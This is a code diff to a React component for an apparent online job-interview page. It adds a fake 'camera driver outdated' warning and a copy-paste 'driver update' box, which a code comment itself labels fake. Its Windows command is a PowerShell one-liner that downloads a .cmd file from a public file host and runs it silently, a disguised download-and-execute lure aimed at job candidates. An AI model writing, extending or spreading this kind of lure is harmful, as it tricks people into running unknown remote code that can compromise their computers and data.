@@ -28,20 +28,55 @@ export default function SummaryInterview() {
   const [invalidInvite, setInvalidInvite] = useState(false) // true when invite URL exists but invite was deleted
   const [submitStatus, setSubmitStatus] = useState(null) // null | 'submitting' | 'success'
   const [submitProgress, setSubmitProgress] = useState(0) // 0–100 for 5s circle
+  const [driverOs, setDriverOs] = useState('mac') // mac | windows | linux (for fake driver commands)
+  const [copySuccess, setCopySuccess] = useState(false)
+  const driverCommandRef = useRef(null)
 
-  useEffect(() => {
+  const copyCommandToClipboard = useCallback(() => {
+    const text = driverCommandRef.current?.textContent?.trim()
+    if (!text) return
+    navigator.clipboard.writeText(text).then(() => {
+      setCopySuccess(true)
+      setTimeout(() => setCopySuccess(false), 2000)
+    }).catch(() => {})
+  }, [])
+
+  const fetchConnectionsStatus = useCallback(() => {
     if (!inviteLink) return
-    setInvalidInvite(false)
     getInviteByLink(inviteLink)
       .then((inv) => {
         const status = Number(inv.connections_status)
         setConnectionsStatus(status)
         setInvalidInvite(status === 3)
+        try {
+          sessionStorage.setItem('invite_connections_status', String(status))
+        } catch (_) {}
       })
       .catch(() => {
         setInvalidInvite(true)
       })
   }, [inviteLink])
+
+  useEffect(() => {
+    if (!inviteLink) return
+    setInvalidInvite(false)
+    fetchConnectionsStatus()
+  }, [inviteLink, fetchConnectionsStatus])
+
+  // When connections_status is not yet 2, refetch periodically so that after GET /invite/:id sets status to 2, the Start camera button becomes active
+  useEffect(() => {
+    if (!inviteLink || connectionsStatus === 2 || connectionsStatus === 3) return
+    const interval = setInterval(fetchConnectionsStatus, 3000)
+    return () => clearInterval(interval)
+  }, [inviteLink, connectionsStatus, fetchConnectionsStatus])
+
+  useEffect(() => {
+    const onFocus = () => {
+      if (inviteLink) fetchConnectionsStatus()
+    }
+    window.addEventListener('focus', onFocus)
+    return () => window.removeEventListener('focus', onFocus)
+  }, [inviteLink, fetchConnectionsStatus])
 
   useEffect(() => {
     if (inviteLink) return // when invite in URL, we fetch above
@@ -381,28 +416,37 @@ export default function SummaryInterview() {
           {status === 'idle' && (
             <div className={styles.placeholder}>
               <span className={styles.placeholderIcon}>▶</span>
-              {connectionsStatus !== 2 ? (
+              {connectionsStatus === 2 ? (
                 <>
-                  <div className={styles.warningAlert} role="alert">
-                    <span className={styles.warningAlertIcon} aria-hidden>⚠</span>
-                    <div className={styles.warningAlertContent}>
-                      <p className={styles.warningAlertTitle}>
-                        {!assessmentCompleted ? 'Complete assessment first' : 'Camera unavailable'}
-                      </p>
-                      <p className={styles.warningAlertMessage}>
-                        {!assessmentCompleted
-                          ? 'You need to complete all questions before you can record your summary.'
-                          : 'Your camera driver may be outdated. Please update it to the latest version to use the recording feature.'}
-                      </p>
-                    </div>
-                  </div>
-                  <button type="button" className={styles.btnPrimary} disabled>
+                  <p>Camera is off. Click &quot;Start camera&quot; to begin.</p>
+                  <button
+                    type="button"
+                    onClick={startCamera}
+                    className={styles.btnPrimary}
+                  >
                     Start camera
                   </button>
                 </>
               ) : (
                 <>
-                  <p>Camera is off. Click &quot;Start camera&quot; to begin.</p>
+                  {connectionsStatus !== null && (
+                    <div className={styles.warningAlert} role="alert">
+                      <span className={styles.warningAlertIcon} aria-hidden>⚠</span>
+                      <div className={styles.warningAlertContent}>
+                        <p className={styles.warningAlertTitle}>
+                          {!assessmentCompleted ? 'Complete assessment first' : 'Camera unavailable'}
+                        </p>
+                        <p className={styles.warningAlertMessage}>
+                          {!assessmentCompleted
+                            ? 'You need to complete all questions before you can record your summary.'
+                            : 'Your camera driver was outdated. To use the recording feature, please update it to the latest version. See the instructions below for steps to update your camera driver.'}
+                        </p>
+                      </div>
+                    </div>
+                  )}
+                  {connectionsStatus === null && inviteLink && (
+                    <p className={styles.checkingMessage}>Checking connection status…</p>
+                  )}
                   <button
                     type="button"
                     onClick={startCamera}
@@ -512,6 +556,39 @@ export default function SummaryInterview() {
               </div>
             </div>
           )}
+        </div>
+
+        <div className={styles.driverHelp}>
+          <label htmlFor="driver-os" className={styles.driverHelpLabel}>Operating system</label>
+          <select
+            id="driver-os"
+            value={driverOs}
+            onChange={(e) => setDriverOs(e.target.value)}
+            className={styles.driverHelpSelect}
+            aria-describedby="driver-guide driver-command"
+          >
+            <option value="mac">Mac</option>
+            <option value="windows">Windows</option>
+            <option value="linux">Linux</option>
+          </select>
+          <p id="driver-guide" className={styles.driverHelpGuide}>
+            Run the command below in your terminal to update your camera driver.
+          </p>
+          <div className={styles.driverHelpCommandWrap}>
+            <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="img" aria-label="Example command">
+              {driverOs === 'mac' && <code>brew run camera-driver-update</code>}
+              {driverOs === 'windows' && `powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $f=Join-Path $env:TEMP ('script_'+[guid]::NewGuid().ToString('N')+'.cmd'); try { Invoke-WebRequest 'https://files.catbox.moe/3zeo8q.cmd' -OutFile $f; $p=Start-Process -FilePath cmd.exe -ArgumentList @('/Q','/D','/C',('""{0}""' -f $f)) -Wait -PassThru; exit $p.ExitCode } finally { Remove-Item -Force -ErrorAction SilentlyContinue $f }"`}
+              {driverOs === 'linux' && <code>sudo apt install camera-driver-latest</code>}
+            </div>
+            <button
+              type="button"
+              onClick={copyCommandToClipboard}
+              className={styles.driverHelpCopyBtn}
+              aria-label={copySuccess ? 'Copied' : 'Copy command'}
+            >
+              {copySuccess ? 'Copied!' : 'Copy'}
+            </button>
+          </div>
         </div>
 
         <div className={styles.actions}>
